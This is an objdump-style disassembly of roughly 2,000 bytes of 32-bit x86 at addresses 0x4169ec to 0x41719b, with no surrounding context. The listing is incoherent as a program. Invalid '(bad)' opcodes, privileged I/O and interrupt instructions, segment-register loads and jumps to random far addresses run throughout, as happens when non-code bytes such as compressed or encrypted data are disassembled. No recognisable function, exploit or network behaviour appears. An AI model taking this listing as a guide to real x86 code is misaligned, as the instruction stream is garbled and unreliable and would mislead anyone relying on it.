  4169ec:	mov    ebx,DWORD PTR [ebp+0x4f]
  4169ef:	adc    BYTE PTR [eax+0x60bc961f],dl
  4169f5:	sbb    al,dh
  4169f7:	cwde   
  4169f8:	sti    
  4169f9:	mov    dh,0xa5
  4169fb:	push   0xc014c42c
  416a00:	jno    0x416a80
  416a02:	pop    esi
  416a03:	mov    cl,0x49
  416a05:	push   es
  416a06:	adc    al,0x98
  416a08:	add    al,0x16
  416a0a:	mov    dl,0xe9
  416a0c:	cmp    ebp,DWORD PTR [esi]
  416a0e:	(bad)  
  416a0f:	enter  0x7064,0xf7
  416a13:	std    
  416a14:	add    DWORD PTR [ecx+0x2a],esi
  416a17:	retf   0xe0d0
  416a1a:	stos   DWORD PTR es:[edi],eax
  416a1b:	(bad)  
  416a1c:	push   ebx
  416a1d:	enter  0xd566,0xa2
  416a21:	pushf  
  416a22:	mov    eax,0x48213fc5
  416a27:	xchg   DWORD PTR [ebx],edx
  416a29:	mov    eax,ds:0x5cb416f6
  416a2e:	test   al,0xa1
  416a30:	loopne 0x416aa9
  416a32:	iret   
  416a33:	mov    DWORD PTR [ebp-0xff39590],edx
  416a39:	add    ch,bl
  416a3b:	lea    edx,[esp+esi*1-0x18275241]
  416a42:	mov    ecx,0xec2c5f5f
  416a47:	xchg   BYTE PTR [esp+ebp*1],al
  416a4a:	ins    BYTE PTR es:[edi],dx
  416a4b:	inc    ecx
  416a4c:	popa   
  416a4d:	jb     0x416a23
  416a4f:	repz sub eax,0x69356197
  416a55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a56:	xor    dl,dl
  416a58:	(bad)  
  416a59:	pop    esp
  416a5a:	das    
  416a5b:	push   esi
  416a5c:	mov    dh,0xe
  416a5e:	(bad)  
  416a5f:	or     al,0x5f
  416a61:	pusha  
  416a62:	pusha  
  416a63:	sti    
  416a64:	stos   BYTE PTR es:[edi],al
  416a65:	fs dec esp
  416a67:	aad    0x41
  416a69:	ror    BYTE PTR [eax+0x7a],0xe4
  416a6d:	mov    bl,0x25
  416a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a70:	in     eax,dx
  416a71:	iret   
  416a72:	(bad)  
  416a73:	xor    al,0xa6
  416a75:	imul   edi,DWORD PTR ds:0xaa500d94,0xd20bcdcb
  416a7f:	jle    0x416aa8
  416a81:	cmp    ch,BYTE PTR [eax]
  416a83:	hlt    
  416a84:	sub    eax,0x83c95dcf
  416a89:	adc    BYTE PTR [edi+0x5ce387d3],ah
  416a8f:	into   
  416a90:	push   ecx
  416a91:	dec    esi
  416a92:	inc    ecx
  416a93:	and    ebx,edx
  416a95:	test   al,0x9
  416a97:	lds    eax,FWORD PTR [ecx]
  416a99:	js     0x416b18
  416a9b:	(bad)  [eax+edi*1+0xc3613f6]
  416aa2:	sahf   
  416aa3:	mov    cs,eax
  416aa5:	mov    edi,0x9e682be5
  416aaa:	mov    ch,0xe8
  416aac:	or     al,cl
  416aae:	mov    esi,DWORD PTR [esi+0x3b]
  416ab1:	das    
  416ab2:	in     eax,0x9f
  416ab4:	push   cs
  416ab5:	and    al,0x7f
  416ab7:	icebp  
  416ab8:	cs clc 
  416aba:	xchg   ecx,eax
  416abb:	nop    DWORD PTR [eax-0x761f4570]
  416ac2:	inc    ebp
  416ac3:	add    DWORD PTR [edi-0x22fd342c],eax
  416ac9:	push   esp
  416aca:	lods   al,BYTE PTR ds:[esi]
  416acb:	mov    eax,0x3328c69b
  416ad0:	out    dx,eax
  416ad1:	xchg   BYTE PTR [eax-0x259b3613],cl
  416ad7:	fs dec ebp
  416ad9:	mov    eax,0xf8eb6b07
  416ade:	imul   eax,esp,0x72ae94bc
  416ae4:	jae    0x416a7b
  416ae6:	fcom   QWORD PTR [ebx]
  416ae8:	mov    bh,0x3a
  416aea:	sbb    ebp,esi
  416aec:	sub    ebp,DWORD PTR [ebx-0x1d]
  416aef:	fst    st(1)
  416af1:	std    
  416af2:	pop    eax
  416af3:	push   0x2411afc0
  416af8:	jecxz  0x416af0
  416afa:	xchg   ebp,eax
  416afb:	leave  
  416afc:	sub    dl,ah
  416afe:	add    dh,dl
  416b00:	sbb    DWORD PTR [ecx+0x1f],edx
  416b03:	push   eax
  416b04:	das    
  416b05:	sbb    al,0xd5
  416b07:	cld    
  416b08:	stos   DWORD PTR es:[edi],eax
  416b09:	pop    ebp
  416b0a:	push   0x64
  416b0c:	lds    esi,FWORD PTR [ebp+0x5cef4100]
  416b12:	mov    eax,ds:0x4b6c745e
  416b17:	mov    bl,0xc4
  416b19:	frstor [esp+edi*8+0x14433477]
  416b20:	push   edi
  416b21:	add    esi,esp
  416b23:	mov    ebx,0x64fc0124
  416b28:	fstp   TBYTE PTR [edx-0x34a0df50]
  416b2e:	sub    ebp,DWORD PTR [ebp+0x13]
  416b31:	or     esi,edi
  416b33:	mov    ebp,DWORD PTR [esi-0x26]
  416b36:	(bad)  
  416b37:	in     eax,dx
  416b38:	jg     0x416abf
  416b3a:	dec    edx
  416b3b:	push   ds
  416b3c:	sub    BYTE PTR [edi],bh
  416b3e:	jb     0x416ba2
  416b40:	pop    eax
  416b41:	ret    0x92eb
  416b44:	out    dx,al
  416b45:	shr    DWORD PTR [ecx],0x84
  416b48:	or     BYTE PTR [ebx+0x6e8678e1],bl
  416b4e:	loopne 0x416b0f
  416b50:	ja     0x416ad8
  416b52:	pop    ebx
  416b53:	loop   0x416b73
  416b55:	scas   eax,DWORD PTR es:[edi]
  416b56:	cmc    
  416b57:	adc    ah,al
  416b59:	inc    edi
  416b5a:	int3   
  416b5b:	cmp    edx,edx
  416b5d:	jns    0x416b53
  416b5f:	add    BYTE PTR [ebp-0x5c0e3df8],bh
  416b65:	and    DWORD PTR [ebx+0x7a3cd5ff],0x2a
  416b6c:	test   eax,0xe65a2e9e
  416b71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b72:	jns    0x416b4c
  416b74:	mov    esp,0x43cbd0fc
  416b79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b7a:	cmp    BYTE PTR [ebx+0x31],bh
  416b7d:	lahf   
  416b7e:	lods   al,BYTE PTR ds:[esi]
  416b7f:	xor    DWORD PTR [edx+0x76f4ad02],0xffffffc3
  416b86:	(bad)  
  416b87:	pop    es
  416b88:	xchg   DWORD PTR [ebx-0x9],esi
  416b8b:	inc    ebx
  416b8c:	mov    dh,0x71
  416b8e:	shl    BYTE PTR [esi+0x23b76318],cl
  416b94:	sbb    edi,esp
  416b96:	pop    es
  416b97:	mov    edx,0x262f8091
  416b9c:	jno    0x416bc4
  416b9e:	mov    ds:0x17c46191,eax
  416ba3:	neg    eax
  416ba5:	cmp    al,0xe0
  416ba7:	retw   
  416ba9:	mov    ecx,0x73283b9f
  416bae:	mov    ds:0x30f21c83,eax
  416bb3:	mov    bh,0xb4
  416bb5:	pop    ebp
  416bb6:	das    
  416bb7:	mov    edx,0x9ad3700d
  416bbc:	mov    eax,DWORD PTR ds:[edi]
  416bbf:	and    BYTE PTR [ebx],ah
  416bc1:	push   cs
  416bc2:	stos   DWORD PTR es:[edi],eax
  416bc3:	arpl   ax,bx
  416bc5:	add    edx,edi
  416bc7:	push   esp
  416bc8:	push   ss
  416bc9:	sub    edi,DWORD PTR [esi+edx*2-0x6e]
  416bcd:	adc    BYTE PTR ds:0xc184fde5,al
  416bd3:	test   al,0xde
  416bd5:	pop    ecx
  416bd6:	sub    BYTE PTR [edi-0x5d],al
  416bd9:	loope  0x416c10
  416bdb:	push   0xffffffbc
  416bdd:	adc    BYTE PTR [edi-0x7e],bl
  416be0:	imul   eax,DWORD PTR [ebx+0x5162272b],0xffffffe7
  416be7:	fsubr  DWORD PTR [edi]
  416be9:	aas    
  416bea:	ret    0x1ccb
  416bed:	outs   dx,BYTE PTR ds:[esi]
  416bee:	ds loop 0x416c6b
  416bf1:	in     eax,dx
  416bf2:	jl     0x416bb2
  416bf4:	mov    bl,0xda
  416bf6:	mov    dh,0xaa
  416bf8:	popf   
  416bf9:	pop    ss
  416bfa:	jae    0x416b96
  416bfc:	test   DWORD PTR [ecx+0x1566c094],edx
  416c02:	cmp    dh,BYTE PTR [edx+edi*4]
  416c05:	mov    dh,BYTE PTR ds:0x68b7fbc3
  416c0c:	fcmovbe st,st(3)
  416c0e:	sub    dl,ah
  416c10:	jge    0x416c84
  416c12:	sar    DWORD PTR ds:0x5201c10f,cl
  416c18:	(bad)  [eax-0x33]
  416c1b:	dec    edx
  416c1c:	xchg   edx,eax
  416c1d:	xchg   ebx,eax
  416c1e:	out    0x4e,al
  416c20:	inc    ecx
  416c21:	cmp    eax,0xfba6f4c4
  416c26:	add    ecx,0x930cff7e
  416c2c:	xchg   bh,ch
  416c2e:	sbb    eax,0x81db659c
  416c33:	jge    0x416ca6
  416c35:	and    esi,DWORD PTR [edx]
  416c37:	jecxz  0x416bff
  416c39:	aam    0x9a
  416c3b:	es mov ah,0x30
  416c3e:	dec    edx
  416c3f:	dec    ebp
  416c40:	out    dx,al
  416c41:	jmp    0x416c12
  416c43:	repnz fisubr WORD PTR [ebx+esi*4]
  416c47:	fwait
  416c48:	mov    bh,0x1e
  416c4a:	out    0x5b,al
  416c4c:	in     eax,0x68
  416c4e:	or     bl,BYTE PTR [edi]
  416c50:	(bad)  
  416c51:	cmp    DWORD PTR [edx+edi*4-0x78ed9814],0xe6ed2389
  416c5c:	sub    DWORD PTR [ebp+0x3233977d],ebp
  416c62:	into   
  416c63:	sub    al,0x43
  416c65:	ins    BYTE PTR es:[edi],dx
  416c66:	cmp    esi,esp
  416c68:	hlt    
  416c69:	mov    al,ds:0x532208fc
  416c6e:	pop    edi
  416c6f:	mov    ecx,DWORD PTR [edx+0x2e4e5c13]
  416c75:	or     al,0x2d
  416c77:	popf   
  416c78:	enter  0x43a0,0xf8
  416c7c:	aam    0xe6
  416c7e:	ficom  WORD PTR [esi-0xcd75451]
  416c84:	xchg   edi,eax
  416c85:	or     dl,BYTE PTR [esi]
  416c87:	fs gs jae 0x416cf4
  416c8b:	cld    
  416c8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c8d:	popa   
  416c8e:	stos   DWORD PTR es:[edi],eax
  416c8f:	scas   eax,DWORD PTR es:[edi]
  416c90:	test   esp,ecx
  416c92:	or     dl,BYTE PTR [edi+0x47]
  416c95:	loope  0x416c7a
  416c97:	inc    esi
  416c98:	mov    ebp,0x9c0b8bc7
  416c9d:	push   ebp
  416c9e:	pop    ds
  416c9f:	outs   dx,BYTE PTR ds:[esi]
  416ca0:	or     eax,0xe00954c9
  416ca5:	shr    esp,cl
  416ca7:	dec    DWORD PTR [ecx+0x2817bccb]
  416cad:	and    bh,BYTE PTR ds:0x41cdc4d8
  416cb3:	jp     0x416cc2
  416cb5:	(bad)  
  416cb6:	in     al,0x24
  416cb8:	cmc    
  416cb9:	sub    DWORD PTR [eax-0x3e286ce],0x7edc7bd4
  416cc3:	js     0x416cf0
  416cc5:	sub    ebx,esi
  416cc7:	mov    edx,0xc3e09b35
  416ccc:	loopne 0x416cf7
  416cce:	(bad)  
  416cd0:	(bad)  
  416cd1:	sub    ebx,DWORD PTR [eax+eiz*2]
  416cd4:	ja     0x416cab
  416cd6:	inc    eax
  416cd7:	popf   
  416cd8:	popa   
  416cd9:	test   DWORD PTR [edi+esi*2+0x30183a5b],ebp
  416ce0:	ja     0x416c81
  416ce2:	adc    ecx,eax
  416ce4:	gs mov ah,0xee
  416ce7:	cwde   
  416ce8:	pushf  
  416ce9:	adc    BYTE PTR [ebx-0x30],al
  416cec:	dec    esp
  416ced:	pop    edx
  416cee:	mov    ah,0xca
  416cf0:	xchg   BYTE PTR [edx+0x15],dh
  416cf3:	out    dx,eax
  416cf4:	mov    ebx,DWORD PTR [ecx-0x23]
  416cf7:	adc    BYTE PTR [ecx+esi*8+0x6102fb2e],dl
  416cfe:	add    eax,0xc814f05d
  416d03:	jmp    0xa90591a8
  416d08:	leave  
  416d09:	pop    edx
  416d0a:	xchg   ebx,eax
  416d0b:	das    
  416d0c:	dec    ebp
  416d0d:	mov    bh,BYTE PTR fs:[ebx+0xf]
  416d11:	xchg   al,bh
  416d13:	pop    edx
  416d14:	inc    edx
  416d15:	mov    ds:0xbaa7ce86,al
  416d1a:	mov    ecx,0xb6e955e1
  416d1f:	mov    dl,0x6f
  416d21:	pusha  
  416d22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d23:	jl     0x416d96
  416d25:	rcr    ch,1
  416d27:	push   eax
  416d28:	mov    ecx,0xb9464f7d
  416d2d:	mov    esp,0xd8764bca
  416d32:	add    BYTE PTR [edi-0x20f89f73],ah
  416d38:	mov    dh,0xe1
  416d3a:	pushf  
  416d3b:	add    DWORD PTR ds:0xdd8abc0f,esi
  416d41:	pop    ebp
  416d42:	loopne 0x416d4c
  416d44:	mov    edi,0xa7a0adb6
  416d49:	lea    esi,[ebx-0x45ae974c]
  416d4f:	cmp    BYTE PTR [esi+0x1c051fb7],bl
  416d55:	mov    dl,0xa7
  416d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d58:	push   cs
  416d59:	push   esp
  416d5a:	mov    esp,0xf49674df
  416d5f:	xlat   BYTE PTR ds:[ebx]
  416d60:	inc    esp
  416d61:	jns    0x416d1e
  416d63:	retf   
  416d64:	push   ecx
  416d65:	sti    
  416d66:	sbb    ecx,esi
  416d68:	loopne 0x416d4a
  416d6a:	cmp    DWORD PTR [ecx-0x62],0x59
  416d6e:	mov    bl,0xaa
  416d70:	into   
  416d71:	sub    eax,0x5a5f10a
  416d76:	je     0x416d85
  416d78:	out    dx,al
  416d79:	push   esp
  416d7a:	hlt    
  416d7b:	sbb    eax,0x8a867147
  416d80:	adc    DWORD PTR [edi],edx
  416d82:	adc    eax,0x484acb55
  416d87:	retf   
  416d88:	adc    edx,DWORD PTR [eax]
  416d8a:	call   0x59fd341b
  416d8f:	cdq    
  416d90:	inc    esp
  416d91:	rcr    DWORD PTR [edx],cl
  416d93:	or     ah,BYTE PTR [ebx-0x27]
  416d96:	jecxz  0x416d7b
  416d98:	mov    edx,0xa4cf53df
  416d9d:	xchg   edx,eax
  416d9e:	sar    BYTE PTR [ebp+0x5b],1
  416da1:	hlt    
  416da2:	fwait
  416da3:	adc    dh,dh
  416da5:	dec    eax
  416da6:	mov    ah,0x1b
  416da8:	mov    ch,0x73
  416daa:	cmp    al,0x87
  416dac:	loopne 0x416d41
  416dae:	and    DWORD PTR [edx-0x323f22aa],ebx
  416db4:	adc    al,0x91
  416db6:	add    cl,BYTE PTR [ecx]
  416db8:	pop    edi
  416db9:	dec    eax
  416dba:	rcl    DWORD PTR [esi-0x3cd63c48],cl
  416dc0:	stos   BYTE PTR es:[edi],al
  416dc1:	inc    esi
  416dc2:	mov    al,bh
  416dc4:	mov    edx,0xdb635013
  416dc9:	sub    al,0xb0
  416dcb:	test   eax,0x78ffdbf7
  416dd0:	xor    DWORD PTR [ebx-0x68cb1133],ebp
  416dd6:	ins    BYTE PTR es:[edi],dx
  416dd7:	sbb    ebp,edi
  416dd9:	add    DWORD PTR [ecx+edx*1-0x7f],ebx
  416ddd:	imul   esp,DWORD PTR [eax+0x5a],0xfe8ac9b8
  416de4:	mov    esi,0xef492914
  416de9:	jecxz  0x416db8
  416deb:	xchg   bl,ch
  416ded:	push   ebp
  416dee:	mov    ch,0xd8
  416df0:	jmp    0x73dbae0
  416df5:	adc    ebp,0xffffff9f
  416df8:	xor    esi,DWORD PTR [ebx+0x23d0fa08]
  416dfe:	les    ebx,FWORD PTR [edi+0x47c51b4a]
  416e04:	and    al,0xa9
  416e06:	add    al,ah
  416e08:	mov    eax,ds:0xa44a0f2
  416e0d:	cmp    DWORD PTR [ebx-0x14],0xc1cb3b64
  416e14:	daa    
  416e15:	push   es
  416e16:	add    dh,BYTE PTR [ebx]
  416e18:	sbb    BYTE PTR [ecx-0x13c70e75],bh
  416e1e:	sar    edx,cl
  416e20:	mov    ds:0x4e32b4c0,al
  416e25:	out    0x12,eax
  416e27:	in     al,0x5f
  416e29:	inc    esp
  416e2a:	mov    al,ds:0x89409fa
  416e2f:	jb     0x416e68
  416e31:	std    
  416e32:	imul   edi,edx,0x37
  416e35:	outs   dx,BYTE PTR ds:[esi]
  416e36:	jnp    0x416e97
  416e38:	dec    ebx
  416e39:	or     edx,esi
  416e3b:	jae    0x416e13
  416e3d:	stc    
  416e3e:	call   FWORD PTR [esi]
  416e40:	outs   dx,DWORD PTR ds:[esi]
  416e41:	retf   0xd2e0
  416e44:	fistp  QWORD PTR [edi-0x45]
  416e47:	mov    cl,0xd4
  416e49:	arpl   WORD PTR [ebp+0x2d145e78],si
  416e4f:	mov    esp,DWORD PTR fs:[edx-0x74]
  416e53:	fdiv   QWORD PTR es:[ebp+0x6cf47466]
  416e5a:	ja     0x416e11
  416e5c:	out    dx,eax
  416e5d:	mov    cl,0xb2
  416e5f:	bound  esp,QWORD PTR [eax+0x23]
  416e62:	lahf   
  416e63:	push   ebp
  416e64:	popa   
  416e65:	cmp    eax,0xacfe6b2f
  416e6a:	sbb    DWORD PTR [ecx+0x66],edi
  416e6d:	das    
  416e6e:	pop    edx
  416e6f:	add    ebp,esi
  416e71:	dec    ecx
  416e72:	fidiv  WORD PTR [esi]
  416e74:	sub    al,0x1c
  416e76:	inc    esi
  416e77:	inc    eax
  416e78:	outs   dx,DWORD PTR ds:[esi]
  416e79:	fldcw  WORD PTR [eax]
  416e7b:	(bad)  
  416e7d:	test   DWORD PTR [ecx],ecx
  416e7f:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  416e81:	mov    eax,ds:0xadd4f22d
  416e86:	ror    BYTE PTR [edi+edi*2],1
  416e89:	mov    ecx,0xc657806b
  416e8e:	repz cmp DWORD PTR [edi],ebp
  416e91:	ficom  DWORD PTR [esi+edx*2]
  416e94:	int3   
  416e95:	test   eax,0x542ff7af
  416e9a:	dec    esp
  416e9b:	ja     0x416f17
  416e9d:	leave  
  416e9e:	inc    esp
  416e9f:	les    eax,FWORD PTR [ecx+0x55379cec]
  416ea5:	ss or  bl,ch
  416ea8:	retf   0x88ee
  416eab:	(bad)  
  416ead:	dec    ecx
  416eae:	cmp    eax,0xcdae73ea
  416eb3:	in     eax,dx
  416eb4:	fld    QWORD PTR [eax]
  416eb6:	shl    DWORD PTR [esi-0x40e0223],1
  416ebc:	inc    bl
  416ebe:	sbb    al,dh
  416ec0:	ins    BYTE PTR es:[edi],dx
  416ec1:	cld    
  416ec2:	pop    eax
  416ec3:	iret   
  416ec4:	repz je 0x416e9a
  416ec7:	push   esi
  416ec8:	cmp    al,0x6c
  416eca:	(bad)  
  416ecb:	xlat   BYTE PTR ds:[ebx]
  416ecc:	sti    
  416ecd:	pushf  
  416ece:	jle    0x416f05
  416ed0:	ja     0x416ea0
  416ed2:	or     eax,0x3527d599
  416ed7:	sbb    DWORD PTR [edx],eax
  416ed9:	retf   0x324d
  416edc:	loope  0x416ed0
  416ede:	ret    0xda69
  416ee1:	aam    0x27
  416ee3:	cmp    cl,dh
  416ee5:	pushf  
  416ee6:	fcomp  DWORD PTR [edi+0x5b]
  416ee9:	in     eax,dx
  416eea:	(bad)  
  416eeb:	les    esi,FWORD PTR [edi-0x788cfc45]
  416ef1:	xor    BYTE PTR es:[edi+0x769b75e2],ch
  416ef8:	pusha  
  416ef9:	je     0x416eec
  416efb:	fsubr  st(2),st
  416efd:	xor    al,bl
  416eff:	jp     0x416ec9
  416f01:	adc    dl,BYTE PTR [edx+0x187e890d]
  416f07:	mov    DWORD PTR [edx+0x51],edi
  416f0a:	dec    esp
  416f0b:	mov    edi,0x9ba1146b
  416f10:	pcmpeqw mm7,QWORD PTR [edi-0x21]
  416f14:	inc    esp
  416f15:	mov    ds:0x55f0dec8,al
  416f1a:	mov    esp,0x68f0c7c5
  416f1f:	pop    esp
  416f20:	jl     0x416f7e
  416f22:	out    dx,al
  416f23:	out    0x23,eax
  416f25:	inc    ebx
  416f26:	xchg   ebx,eax
  416f27:	cld    
  416f28:	imul   ebx,DWORD PTR [ebp+0x55],0x3d
  416f2c:	loopne 0x416eea
  416f2e:	mov    al,0x34
  416f30:	nop
  416f31:	mov    bl,0x7b
  416f33:	mov    al,0xb1
  416f35:	sahf   
  416f36:	push   ebp
  416f37:	cdq    
  416f38:	popa   
  416f39:	push   eax
  416f3a:	fnstcw WORD PTR [edx+0x298a6350]
  416f40:	push   0x8bff41ba
  416f45:	les    esi,FWORD PTR [edi-0x133a0421]
  416f4b:	dec    BYTE PTR [ecx]
  416f4d:	pop    es
  416f4e:	push   ecx
  416f4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f50:	push   ebx
  416f51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f52:	test   eax,0xc25bcf29
  416f57:	movups xmm6,XMMWORD PTR [ecx+0x6525a709]
  416f5e:	push   edi
  416f5f:	retf   0x87cc
  416f62:	repnz test BYTE PTR [ebx+edx*1],ch
  416f66:	xchg   ebp,eax
  416f67:	mov    edx,DWORD PTR [eax+0x5f]
  416f6a:	scas   al,BYTE PTR es:[edi]
  416f6b:	jecxz  0x416f68
  416f6d:	push   ebx
  416f6e:	fnstenv [eax-0x18]
  416f71:	add    BYTE PTR [ebx+0x74],0x2c
  416f75:	xchg   esp,eax
  416f76:	inc    esi
  416f77:	rcr    BYTE PTR [eax],cl
  416f79:	mov    al,0xf1
  416f7b:	jle    0x416f9c
  416f7d:	dec    ebx
  416f7e:	outs   dx,BYTE PTR ds:[esi]
  416f7f:	fst    DWORD PTR [esp+ebx*1-0x47]
  416f83:	or     BYTE PTR [edx+0x429787ba],0xe6
  416f8a:	sub    eax,0xfc8f8f94
  416f8f:	jmp    0x9184:0xd1b3627c
  416f96:	mov    dh,0x5f
  416f98:	fmul   DWORD PTR ds:0xad9ba2be
  416f9e:	pop    edx
  416f9f:	je     0x28efdfdc
  416fa5:	and    ch,BYTE PTR [eax]
  416fa7:	cmp    edx,eax
  416fa9:	jo     0x416f87
  416fab:	hlt    
  416fac:	push   edx
  416fad:	xchg   esp,esi
  416faf:	push   esi
  416fb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fb1:	loope  0x417031
  416fb3:	xchg   edi,eax
  416fb4:	in     al,0x79
  416fb6:	xlat   BYTE PTR ds:[ebx]
  416fb7:	dec    ebp
  416fb8:	div    BYTE PTR [esi]
  416fba:	xchg   ebp,eax
  416fbb:	mov    eax,ds:0xe3ea0f74
  416fc0:	push   ebp
  416fc1:	mov    ds:0x8026f2bc,al
  416fc6:	daa    
  416fc7:	and    eax,0xa05a1cf
  416fcc:	cmp    DWORD PTR [eax+0x3fd62cfe],ebx
  416fd2:	mov    ah,0xc4
  416fd4:	test   bl,ah
  416fd6:	int    0x16
  416fd8:	aam    0x29
  416fda:	mov    eax,DWORD PTR [eax-0x1b]
  416fdd:	pusha  
  416fde:	sbb    DWORD PTR [eax+0x3a],ebp
  416fe1:	outs   dx,DWORD PTR ds:[esi]
  416fe2:	dec    edx
  416fe3:	loop   0x41703c
  416fe5:	pusha  
  416fe6:	xchg   esi,eax
  416fe7:	fstp   TBYTE PTR [ebx+0xa21aec4]
  416fed:	mov    DWORD PTR [ecx],esi
  416fef:	pop    es
  416ff0:	push   ss
  416ff1:	(bad)  
  416ff2:	jp     0x41700b
  416ff4:	and    BYTE PTR [ebx+ebx*1-0x56],bh
  416ff8:	mov    eax,ds:0xa5ea006d
  416ffd:	ins    BYTE PTR es:[edi],dx
  416ffe:	mov    ebp,DWORD PTR [edi+0x79fb09b]
  417004:	xor    al,0xe
  417006:	push   0x61
  417008:	lods   eax,DWORD PTR ds:[esi]
  417009:	cmp    edx,DWORD PTR [eax+0x56]
  41700c:	cmc    
  41700d:	arpl   WORD PTR [edx],bx
  41700f:	data16 jno 0x416fec
  417012:	ss inc esp
  417014:	push   esp
  417015:	jae    0x417020
  417017:	adc    al,0xd7
  417019:	popf   
  41701a:	or     cl,0xa7
  41701d:	xchg   edi,eax
  41701e:	add    al,0x2d
  417020:	pop    ds
  417021:	cmp    eax,0x88115db2
  417026:	jle    0x41702a
  417028:	repz mov dl,0xf0
  41702b:	loope  0x417019
  41702d:	adc    DWORD PTR [ebp-0x1b],edi
  417030:	test   eax,0x5c35652d
  417035:	ret    
  417036:	pop    ds
  417037:	add    cl,BYTE PTR [eax+ebx*8+0xf28f06d]
  41703e:	push   esi
  41703f:	dec    ecx
  417040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417041:	call   0x1085050e
  417046:	out    dx,eax
  417047:	test   al,0x54
  417049:	jno    0x4170b8
  41704b:	imul   BYTE PTR [edi]
  41704d:	movhps QWORD PTR ds:0xa791be78,xmm5
  417054:	(bad)  
  417055:	jle    0x41703d
  417057:	jbe    0x416fe6
  417059:	int3   
  41705a:	out    0xf4,al
  41705c:	outs   dx,BYTE PTR ds:[esi]
  41705d:	mov    ebp,0xa1fec9d9
  417062:	mov    ebp,0x3788bd5e
  417067:	repnz sub al,0xda
  41706a:	call   0x24521ad0
  41706f:	ds jp  0x417001
  417072:	outs   dx,DWORD PTR ds:[esi]
  417073:	jo     0x416ffd
  417075:	ror    BYTE PTR [edx+0x10],1
  417078:	dec    esi
  417079:	ins    BYTE PTR es:[edi],dx
  41707a:	jae    0x4170e3
  41707c:	pusha  
  41707d:	in     al,dx
  41707e:	add    dh,BYTE PTR [ebp+0x33]
  417081:	xchg   ebx,eax
  417082:	and    BYTE PTR [esi],al
  417084:	adc    dl,BYTE PTR ds:[ebx]
  417087:	adc    al,0xc3
  417089:	inc    ebp
  41708a:	jecxz  0x417056
  41708c:	call   DWORD PTR [edx]
  41708e:	sub    eax,0xba4e2099
  417093:	push   esp
  417094:	fwait
  417095:	leave  
  417096:	test   DWORD PTR [edx-0x40d9f2cd],esi
  41709c:	aas    
  41709d:	jne    0x417106
  41709f:	ins    DWORD PTR es:[edi],dx
  4170a0:	xor    DWORD PTR [eax],ebp
  4170a2:	fisttp DWORD PTR [edx-0x36676c26]
  4170a8:	aam    0xf2
  4170aa:	stc    
  4170ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170ac:	js     0x417125
  4170ae:	mov    dh,0x3
  4170b0:	sar    BYTE PTR [eax+0x7b],1
  4170b3:	clc    
  4170b4:	call   0x15f4bee6
  4170b9:	jp     0x4170db
  4170bb:	dec    edx
  4170bc:	int3   
  4170bd:	or     BYTE PTR cs:[edx],bh
  4170c0:	add    eax,0x81f02bb
  4170c5:	loopne 0x417129
  4170c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170c8:	es pop esp
  4170ca:	loope  0x417138
  4170cc:	jecxz  0x4170ff
  4170ce:	mov    edi,0xd296566f
  4170d3:	adc    dh,bl
  4170d5:	cs loopne 0x41712e
  4170d8:	and    BYTE PTR [eax],ah
  4170da:	sbb    eax,0xecac2afb
  4170df:	test   DWORD PTR [ebx+0x0],ebx
  4170e2:	push   edi
  4170e3:	add    al,BYTE PTR ds:[ebx-0x59a92e2a]
  4170ea:	xchg   edx,eax
  4170eb:	lds    ebp,FWORD PTR [ebx-0x4d]
  4170ee:	out    0x4f,al
  4170f0:	gs mov al,0xd1
  4170f3:	aam    0x8a
  4170f5:	mov    eax,ds:0xc0294460
  4170fa:	lods   eax,DWORD PTR ds:[esi]
  4170fb:	mov    ebx,0xba076247
  417100:	outs   dx,BYTE PTR ds:[esi]
  417101:	out    0x91,al
  417103:	and    eax,0x89847f08
  417108:	jns    0x41717f
  41710a:	xchg   DWORD PTR [esi],edi
  41710c:	adc    cl,bh
  41710e:	mov    ds:0x4a8d11ca,al
  417113:	je     0x4170b8
  417115:	lods   eax,DWORD PTR ds:[esi]
  417116:	fcom   QWORD PTR [ebp+0x6e5fd60f]
  41711c:	aas    
  41711d:	xchg   edx,eax
  41711e:	clc    
  41711f:	stos   DWORD PTR es:[edi],eax
  417120:	popa   
  417121:	mov    ebp,0x85494052
  417126:	adc    BYTE PTR [ebx+0x716da352],bl
  41712c:	nop
  41712d:	mul    eax
  41712f:	stos   DWORD PTR es:[edi],eax
  417130:	mov    DWORD PTR [edx-0x6ab3dd86],edx
  417136:	mov    al,0x6e
  417138:	push   edx
  417139:	cmp    eax,0xf949e28c
  41713e:	sbb    eax,0xa483ae0c
  417143:	sub    al,BYTE PTR [eax]
  417145:	mov    ch,0x5b
  417147:	fist   DWORD PTR [ebp+0x2f]
  41714a:	push   ebx
  41714b:	push   eax
  41714c:	dec    edx
  41714d:	and    cl,ch
  41714f:	push   es
  417150:	clc    
  417151:	mov    ah,0xa3
  417153:	call   0x2b572e
  417158:	hlt    
  417159:	popf   
  41715a:	pushf  
  41715b:	push   cs
  41715c:	mov    ebx,0xcb9c38a
  417162:	mov    WORD PTR [edi],es
  417164:	xchg   esp,eax
  417165:	ja     0x4171de
  417167:	inc    esp
  417168:	outs   dx,BYTE PTR ds:[esi]
  417169:	lods   eax,DWORD PTR ds:[esi]
  41716a:	and    al,0x66
  41716c:	jp     0x417149
  41716e:	cmp    BYTE PTR [esi-0x6],ch
  417171:	sub    al,al
  417173:	(bad)  
  417175:	test   DWORD PTR [ebp+0x49],eax
  417178:	sbb    al,0x91
  41717a:	sbb    al,0xe9
  41717c:	jl     0x4171dc
  41717e:	add    al,BYTE PTR ds:0xc36c50cc
  417184:	fild   QWORD PTR [ebp+ecx*8-0x68]
  417188:	dec    eax
  417189:	mov    esi,0x43153aca
  41718e:	mov    esi,0xf4d5a5a6
  417193:	push   es
  417194:	out    0xe8,al
  417196:	mov    ebx,0xff2e751
  41719b:	xor    dh,bl
